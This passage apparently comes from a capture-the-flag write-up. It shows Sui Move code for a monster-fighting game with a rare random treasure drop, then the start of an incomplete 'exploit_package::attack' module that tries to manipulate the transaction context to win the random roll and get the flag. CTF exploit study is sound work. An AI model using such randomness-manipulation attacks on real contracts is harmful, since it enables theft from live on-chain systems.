</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>min_hp</span>: <span class=kt>u64</span><span class=p>,</span><span class=w> </span><span class=n>max_hp</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>min_strength</span>: <span class=kt>u64</span><span class=p>,</span><span class=w> </span><span class=n>max_strength</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>min_defense</span>: <span class=kt>u64</span><span class=p>,</span><span class=w> </span><span class=n>max_defense</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>)</span>: <span class=nc>Monster</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=p>{</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>object</span>::<span class=n>new</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span><span class=w>       
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>hp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>random</span>::<span class=n>rand_u64_range</span><span class=p>(</span><span class=n>min_hp</span><span class=p>,</span><span class=w> </span><span class=n>max_hp</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>strength</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>random</span>::<span class=n>rand_u64_range</span><span class=p>(</span><span class=n>min_strength</span><span class=p>,</span><span class=w> </span><span class=n>max_strength</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>defense</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>random</span>::<span class=n>rand_u64_range</span><span class=p>(</span><span class=n>min_defense</span><span class=p>,</span><span class=w> </span><span class=n>max_defense</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Monster</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>id</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hp</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>strength</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>defense</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=sd>/// return: 0: tie, 1: hero win, 2: monster win;
</span></span></span><span class=line><span class=cl><span class=sd></span><span class=n>fun</span><span class=w> </span><span class=n>fight_monster</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=p>(</span><span class=n>hero</span>: <span class=kp>&amp;</span><span class=nc>Hero</span><span class=p>,</span><span class=w> </span><span class=n>monster</span>: <span class=kp>&amp;</span><span class=nc>Monster</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=p>)</span>: <span class=kt>u64</span> <span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>hero_strength</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>hero</span>::<span class=n>strength</span><span class=p>(</span><span class=n>hero</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>hero_defense</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>hero</span>::<span class=n>defense</span><span class=p>(</span><span class=n>hero</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>hero_hp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>hero</span>::<span class=n>hp</span><span class=p>(</span><span class=n>hero</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>monster_hp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>monster</span><span class=p>.</span><span class=n>hp</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// attack the monster until its HP goes to zero
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>cnt</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=k>u64</span><span class=p>;</span><span class=w> </span><span class=c1>// max fight times
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>rst</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=k>u64</span><span class=p>;</span><span class=w> </span><span class=c1>// 0: tie, 1: hero win, 2: monster win;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>monster_hp</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// first, the hero attacks
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>damage</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>hero_strength</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>monster</span><span class=p>.</span><span class=n>defense</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>hero_strength</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>monster</span><span class=p>.</span><span class=n>defense</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=mi>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>damage</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>monster_hp</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>monster_hp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>monster_hp</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>damage</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// then, the boar gets a turn to attack. if the boar would kill
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>            </span><span class=c1>// the hero, abort--we can&#39;t let the boar win!
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>            </span><span class=kd>let</span><span class=w> </span><span class=n>damage</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>monster</span><span class=p>.</span><span class=n>strength</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>hero_defense</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>monster</span><span class=p>.</span><span class=n>strength</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>hero_defense</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=mi>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>damage</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>hero_hp</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>rst</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>2</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>break</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>hero_hp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>hero_hp</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>damage</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>rst</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>break</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>cnt</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cnt</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cnt</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>20</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>break</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>rst</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>public</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>slay_boar</span><span class=p>(</span><span class=n>hero</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>Hero</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>assert!</span><span class=p>(</span><span class=n>hero</span>::<span class=n>stamina</span><span class=p>(</span><span class=n>hero</span><span class=p>)</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=n>EHERO_TIRED</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>boar</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>create_monster</span><span class=o>&lt;</span><span class=n>Boar</span><span class=o>&gt;</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BOAR_MIN_HP</span><span class=p>,</span><span class=w> </span><span class=n>BOAR_MAX_HP</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BOAR_MIN_STRENGTH</span><span class=p>,</span><span class=w> </span><span class=n>BOAR_MAX_STRENGTH</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BOAR_MIN_DEFENSE</span><span class=p>,</span><span class=w> </span><span class=n>BOAR_MAX_DEFENSE</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ctx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>fight_result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fight_monster</span><span class=o>&lt;</span><span class=n>Boar</span><span class=o>&gt;</span><span class=p>(</span><span class=n>hero</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>boar</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>hero</span>::<span class=n>decrease_stamina</span><span class=p>(</span><span class=n>hero</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// hero takes their licks
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>fight_result</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hero</span>::<span class=n>increase_experience</span><span class=p>(</span><span class=n>hero</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>d100</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>random</span>::<span class=n>rand_u64_range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>100</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>d100</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>10</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>let</span><span class=w> </span><span class=n>sword</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>inventory</span>::<span class=n>create_sword</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>hero</span>::<span class=n>equip_or_levelup_sword</span><span class=p>(</span><span class=n>hero</span><span class=p>,</span><span class=w> </span><span class=n>sword</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>d100</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>20</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>let</span><span class=w> </span><span class=n>armor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>inventory</span>::<span class=n>create_armor</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>hero</span>::<span class=n>equip_or_levelup_armor</span><span class=p>(</span><span class=n>hero</span><span class=p>,</span><span class=w> </span><span class=n>armor</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// let the world know about the hero&#39;s triumph by emitting an event!
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>event</span>::<span class=n>emit</span><span class=p>(</span><span class=n>SlainEvent</span><span class=o>&lt;</span><span class=n>Boar</span><span class=o>&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>slayer_address</span>: <span class=nc>tx_context</span>::<span class=n>sender</span><span class=p>(</span><span class=n>ctx</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hero</span>: <span class=nc>hero</span>::<span class=n>id</span><span class=p>(</span><span class=n>hero</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>boar</span>: <span class=nc>object</span>::<span class=n>uid_to_inner</span><span class=p>(</span><span class=o>&amp;</span><span class=n>boar</span><span class=p>.</span><span class=n>id</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>Monster</span><span class=o>&lt;</span><span class=n>Boar</span><span class=o>&gt;</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>id</span><span class=p>,</span><span class=w> </span><span class=n>hp</span>: <span class=nc>_</span><span class=p>,</span><span class=w> </span><span class=n>strength</span>: <span class=nc>_</span><span class=p>,</span><span class=w> </span><span class=n>defense</span>: <span class=nc>_</span><span class=p>}</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>boar</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>object</span>::<span class=n>delete</span><span class=p>(</span><span class=n>id</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>public</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>slay_boar_king</span><span class=p>(</span><span class=n>hero</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>Hero</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=fm>assert!</span><span class=p>(</span><span class=n>hero</span>::<span class=n>stamina</span><span class=p>(</span><span class=n>hero</span><span class=p>)</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=n>EHERO_TIRED</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>boar</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>create_monster</span><span class=o>&lt;</span><span class=n>BoarKing</span><span class=o>&gt;</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BOARKING_MIN_HP</span><span class=p>,</span><span class=w> </span><span class=n>BOARKING_MAX_HP</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BOARKING_MIN_STRENGTH</span><span class=p>,</span><span class=w> </span><span class=n>BOARKING_MAX_STRENGTH</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BOARKING_MIN_DEFENSE</span><span class=p>,</span><span class=w> </span><span class=n>BOARKING_MAX_DEFENSE</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ctx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>fight_result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fight_monster</span><span class=o>&lt;</span><span class=n>BoarKing</span><span class=o>&gt;</span><span class=p>(</span><span class=n>hero</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>boar</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>hero</span>::<span class=n>decrease_stamina</span><span class=p>(</span><span class=n>hero</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// hero takes their licks
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>fight_result</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=c1>// hero won
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>        </span><span class=n>hero</span>::<span class=n>increase_experience</span><span class=p>(</span><span class=n>hero</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>d100</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>random</span>::<span class=n>rand_u64_range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>100</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>d100</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>let</span><span class=w> </span><span class=k>box</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>inventory</span>::<span class=n>create_treasury_box</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>transfer</span>::<span class=n>transfer</span><span class=p>(</span><span class=k>box</span><span class=p>,</span><span class=w> </span><span class=n>tx_context</span>::<span class=n>sender</span><span class=p>(</span><span class=n>ctx</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// let the world know about the hero&#39;s triumph by emitting an event!
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>event</span>::<span class=n>emit</span><span class=p>(</span><span class=n>SlainEvent</span><span class=o>&lt;</span><span class=n>BoarKing</span><span class=o>&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>slayer_address</span>: <span class=nc>tx_context</span>::<span class=n>sender</span><span class=p>(</span><span class=n>ctx</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hero</span>: <span class=nc>hero</span>::<span class=n>id</span><span class=p>(</span><span class=n>hero</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>boar</span>: <span class=nc>object</span>::<span class=n>uid_to_inner</span><span class=p>(</span><span class=o>&amp;</span><span class=n>boar</span><span class=p>.</span><span class=n>id</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>Monster</span><span class=o>&lt;</span><span class=n>BoarKing</span><span class=o>&gt;</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>id</span><span class=p>,</span><span class=w> </span><span class=n>hp</span>: <span class=nc>_</span><span class=p>,</span><span class=w> </span><span class=n>strength</span>: <span class=nc>_</span><span class=p>,</span><span class=w> </span><span class=n>defense</span>: <span class=nc>_</span><span class=p>}</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>boar</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>object</span>::<span class=n>delete</span><span class=p>(</span><span class=n>id</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-rs data-lang=rs><span class=line><span class=cl><span class=c1>//Exploit
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>module</span><span class=w> </span><span class=n>exploit_package</span>::<span class=n>attack</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>game</span>::<span class=n>hero</span>::<span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hero</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>level_up</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>game</span>::<span class=n>adventure</span>::<span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>slay_boar</span><span class=p>,</span><span class=n>slay_boar_king</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>game</span>::<span class=n>inventory</span>::<span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TreasuryBox</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>get_flag</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>ctf</span>::<span class=n>random</span>::<span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>rand_u64_range</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>sui</span>::<span class=n>tx_context</span>::<span class=p>{</span><span class=n>TxContext</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>public</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>getFlag</span><span class=p>(</span><span class=k>box</span>: <span class=nc>TreasuryBox</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>ctx_</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>morphContext</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>rand_u64_range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>100</span><span class=p>,</span><span class=n>ctx_</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>get_flag</span><span class=p>(</span><span class=k>box</span><span class=p>,</span><span class=n>ctx_</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=k>else</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// TODO: Morph ctx
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>            </span><span class=n>get_flag</span><span class=p>(</span><span class=k>box</span><span class=p>,</span><span class=n>ctx_</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
